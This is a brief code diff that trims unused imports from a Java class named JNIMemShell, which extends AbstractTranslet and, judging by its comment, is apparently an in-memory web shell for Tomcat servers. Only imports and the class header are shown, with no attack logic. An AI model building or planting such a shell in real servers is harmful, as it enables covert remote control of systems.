@@ -10,14 +10,12 @@ import org.apache.catalina.WebResourceRoot;
 import org.apache.catalina.core.*;
 import org.apache.catalina.loader.WebappClassLoaderBase;
 
-import javax.servlet.*;
 import java.io.File;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
-import java.lang.reflect.Modifier;
-import java.util.Enumeration;
+
 
 //JNI shell ，但是只能回显一次
 public class JNIMemShell extends AbstractTranslet{
